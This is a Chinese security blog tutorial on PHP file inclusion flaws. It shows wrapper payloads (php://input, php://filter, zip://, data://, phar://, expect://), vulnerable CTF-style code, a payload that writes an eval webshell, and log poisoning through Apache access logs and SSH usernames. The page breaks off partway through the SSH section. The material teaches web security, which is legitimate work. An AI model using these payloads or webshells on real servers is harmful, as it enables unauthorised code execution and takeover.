href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">浅析文件包含</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-07T01:29:55.116Z" title="发表于 2023-08-07 09:29:55">2023-08-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-22T08:03:55.268Z" title="更新于 2023-10-22 16:03:55">2023-10-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="浅析文件包含"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/08/07/qian-xi-wen-jian-bao-han/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/08/07/qian-xi-wen-jian-bao-han/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">浅析文件包含</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-08-07T01:29:55.116Z" title="发表于 2023-08-07 09:29:55">2023-08-07</time><time itemprop="dateCreated datePublished" datetime="2023-10-22T08:03:55.268Z" title="更新于 2023-10-22 16:03:55">2023-10-22</time></header><h1 id="文件包含总结">文件包含总结</h1>
<h2 id="0x01-文件包含的概念">0x01 文件包含的概念：</h2>
<p><strong>把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</strong></p>
<h3 id="11-文件包含的原理">1.1 文件包含的原理：</h3>
<p><strong>文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</strong></p>
<h3 id="12-文件包含分类">1.2 文件包含分类：</h3>
<p><strong>文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。</strong></p>
<pre><code class="hljs plaintext">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。
远程文件包含：通过HTTP协议包含其他地方的资源</code></pre>
<h3 id="13-文件包含函数">1.3 文件包含函数：</h3>
<p><strong>1,  include():找不到被包含文件时会产生警告(E_ WARNING) ;</strong><br>
<strong>2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含</strong><br>
<strong>3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR)</strong><br>
<strong>4，require_ once():与require ()类似，代码已经被包含则不会再次包含</strong></p>
<p><strong>思维导图：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321185813902.png" alt="image-20230321185813902"></p>
<h2 id="0x02-php伪协议">0x02 PHP伪协议：</h2>
<p><strong>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</strong></p>
<h3 id="21-phpinput">2.1 php://input</h3>
<p><strong>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
<pre><code class="hljs plaintext">poc：
?file=php://input
[POST DATA] &lt;?php phpinfo();?&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321192756427.png" alt="image-20230321192756427"></p>
<p><strong>注：利用php://input还可以写入php木马,即在post中传入如下代码：</strong></p>
<pre><code class="hljs plaintext">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code></pre>
<p>例子：</p>
<pre><code class="hljs php"><span class="hljs-comment">//test.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}

<span class="hljs-comment">//flag.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">'flag{flag_is_here}'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。</strong><br>
<strong>注：遇到file_get_contents()要想到用php://input绕过。</strong></p>
<h3 id="22-phpfilter">2.2 php://filter</h3>
<p><strong>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</strong></p>
<table>
<thead>
<tr>
<th>前缀名称</th>
<th>后加内容</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=</td>
<td>要过滤的数据流</td>
<td>指定要过滤的数据流</td>
</tr>
<tr>
<td>read=</td>
<td>读链的筛选器列表</td>
<td>参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔</td>
</tr>
<tr>
<td>write=</td>
<td>写链的筛选器列表</td>
<td>参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔</td>
</tr>
<tr>
<td>空</td>
<td>两个链的筛选器列表</td>
<td>没有用read=或者write=做前缀的筛选器列表会是轻快应用于读或者写</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">poc1:
?file=php://filter/resource=xxx.php
poc2:
?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
<pre><code class="hljs plaintext">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里
就会用到php://filter。
php://filter读取文件源代码的时候
需要用到编码器
php://filter/resource=phpinfo.php
php://filter/read=convert.base64-encode/resource=phpinfo.php
php://filter 一般读取文件源代码，然后再进行审计
php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。
可以直接用不带任何过滤器的filter伪协议
payload:file=php://filter/resource=flag.php
也可以用一些没有过滤掉的编码方式和转换方式
payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></pre>
<pre><code class="hljs plaintext">怎么写入一句话木马?
$filename = $_GET['file'];
$content = $_GET['content'];
file_put_contents($filename,"&lt;?php exit();".$content);

exit() 退出程序
这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配
置文件等等不允许用户直接访问的文件当中。</code></pre>
<p><strong>exit死亡绕过参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></strong></p>
<p><strong>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</strong></p>
<p><strong>注：更多php://filter用法可参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></strong></p>
<p><strong>eg1:</strong></p>
<pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"php://input"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"zip://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"phar://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data:"</span>)){
	<span class="hljs-keyword">exit</span>(<span class="hljs-string">'hacker!'</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>){
	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);
}<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230321193810165.png" alt="image-20230321193810165"></p>
<p><strong>尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容</strong>：</p>
<p><strong>尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</strong></p>
<h3 id="23-zip">2.3 zip://</h3>
<p><strong>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</strong></p>
<pre><code>zip://中只能传入绝对路径。(php版本大于等于php5.3.0)

要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）

只需要是zip的压缩包即可，后缀名可以任意更改。

相同的类型的还有zlib://和bzip2://
file=compress.zlib://flag.php
</code></pre>
<pre><code class="hljs plaintext">poc:
zip://[压缩包绝对路径]#[压缩包内文件]
?file=zip://D:\zip.jpg%23phpinfo.txt</code></pre>
<p><strong>例子：</strong></p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"input"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"filter"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data"</span>)<span class="hljs-comment">/*||stristr($file,"phar")*/</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"hick?"</span>;
	<span class="hljs-keyword">exit</span>();
}<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">".php"</span>);
}
<span class="hljs-meta">?&gt;</span>
&lt;!-- flag在当前目录的某个文件中 --&gt;</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//upload.php</span>
&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;form action=<span class="hljs-string">"upload.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span> &gt;
	 &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"fupload"</span> /&gt;
 	&lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload!"</span> /&gt;
&lt;/form&gt;
you can upload jpg,png,zip....&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'fupload'</span>] ) ) {
    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'name'</span> ];         <span class="hljs-comment">//文件名</span>
    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);   <span class="hljs-comment">//文件后缀</span>
    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'size'</span> ];         <span class="hljs-comment">//文件大小</span>
    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'tmp_name'</span> ];     <span class="hljs-comment">// 存储在服务器的文件的临时副本的名称</span>
    <span class="hljs-variable">$target_path</span> = <span class="hljs-string">"uploads\\"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())).<span class="hljs-string">"."</span>.<span class="hljs-variable">$uploaded_ext</span>;
    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"zip"</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {
        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {<span class="hljs-comment">// No</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;
        }
        <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Yes!</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span>.<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">"\\<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
        }
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;
    }
}
 <span class="hljs-meta">?&gt;</span>
     
<span class="hljs-comment">//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）</span></code></pre>
<h3 id="24-data与phar">2.4 data://与phar://</h3>
<p><strong>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。)</strong></p>
<p>利用条件:</p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<pre><code class="hljs plaintext">poc:若纯文字没用可用[base64编码]
data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;
?file=data://,&lt;?php phpinfo();?&gt;
?file=data://text/plain,&lt;?php phpinfo();?&gt;
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
?file=data:text/plain,&lt;?php phpinfo();?&gt;
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></pre>
<p><strong>phar:// 有点类似zip://同样可以导致 任意代码执行。</strong></p>
<pre><code class="hljs plaintext">phar://中相对路径和绝对路径都可以使用
利用条件：
php版本大于等于php5.3.0</code></pre>
<pre><code class="hljs plaintext">poc:
假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：
指定绝对路径
index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt

或者使用相对路径（这里test.zip就在当前目录下）
index.php?file=phar://test.zip/phpinfo.txt</code></pre>
<h3 id="25-expect伪协议">2.5 expect://伪协议</h3>
<p>expect://伪协议用来执行系统命令，但是需要安装拓展<br>
用法: <code>?file=expect://ls</code></p>
<h2 id="0x03-特殊文件包含">0x03 特殊文件包含</h2>
<p>服务器的中间件，ssh服务都有日志记录的功能。如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。<br>
如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。<br>
典型的日志文件包含：</p>
<ul>
<li>中间件日志文件包含</li>
<li>ssh日志文件包含</li>
</ul>
<p><strong>中间件日志文件包含</strong></p>
<p>利用条件：</p>
<ul>
<li>web中间件日志文件的存储位置已知，并且具有可读权限</li>
</ul>
<p>下面开始介绍日志文件包含漏洞利用步骤</p>
<p><strong>1. 将恶意代码写入到日志文件</strong></p>
<p>中间件开启了访问日志记录功能，会访问日志写入到日志文件中。<br>
假设访问URL：<a target="_blank" rel="noopener" href="http://192.168.1.2/xxx/index.php">http://192.168.1.2/xxx/index.php</a><br>
发现会在日志文件中有如下内容：</p>
<pre><code class="hljs csharp">[<span class="hljs-meta">root@aaa</span>]<span class="hljs-meta">#less /var/log/httpd/access_log</span>
<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span> - - [<span class="hljs-number">09</span>/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">20</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">"GET /xxx/index.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">86.</span>...</code></pre>
<p>中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。<br>
利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去：<br>
添加恶意代码：<code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code><br>
此时会提示404，但是不急<br>
查看日志文件，发现已经将内容写入</p>
<pre><code class="hljs perl">[root@aaa]<span class="hljs-comment">#less /var/log/httpd/access_log</span>
<span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span> - - [09/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span>:<span class="hljs-number">23</span> +080<span class="hljs-number">0</span>] <span class="hljs-string">"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">826</span>....</code></pre>
<p>虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用<br>
<strong>可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码</strong><br>
查看日志文件，内容如下</p>
<pre><code class="hljs php-template"><span class="language-xml">[root@aaa]#less /var/log/httpd/access_log</span>
<span class="language-xml">192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> HTTP/1.1" 404 302....</span></code></pre>
<p>恶意代码成功写入</p>
<p><strong>2. 文件包含日志文件</strong></p>
<p>要执行文件包含，必须要知道日志文件的位置。<br>
常见的中间件日志文件都有默认的存储路径，比如Apache的中间件日志文件存在/var/log/httpd/目录下，文件名叫access_log<br>
输入测试语句<code>http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log</code><br>
之后在向网页传入POST参数：<code>123=phpinfo</code><br>
即可显示出phpinfo的内容</p>
<h3 id="31-包含apache日志文件">3.1 包含Apache日志文件</h3>
<p><strong>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</strong></p>
<pre><code class="hljs plaintext">利用条件：
对日志文件可读
知道日志文件的存储目录

注意：
一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知

日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式</code></pre>
<p><strong>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>
  如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><!--?php phpinfo(); ?-->,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<!--?php phpinfo(); ?--> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</strong></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">1.包含日志文件getshell</a><br>
     <a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">2.一道包含日志文件的CTF题</a></p>
<p>这里提供一道包含日志的CTF题目：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
<h3 id="32-包含ssh-log日志文件">3.2 包含SSH log日志文件</h3>
<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>下面介绍漏洞利用步骤</p>
<p><strong>1. 将恶意代码写入文件</strong></p>
<p>SSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中<br>
将连接的用户名设置成恶意代码，用命令连接受害者的服务器ip(192.168.1.1)的ssh服务<br>
<code>ssh "&lt;?php @eval($_POST[123]);?&gt;"@192.168.1.1</code><br>
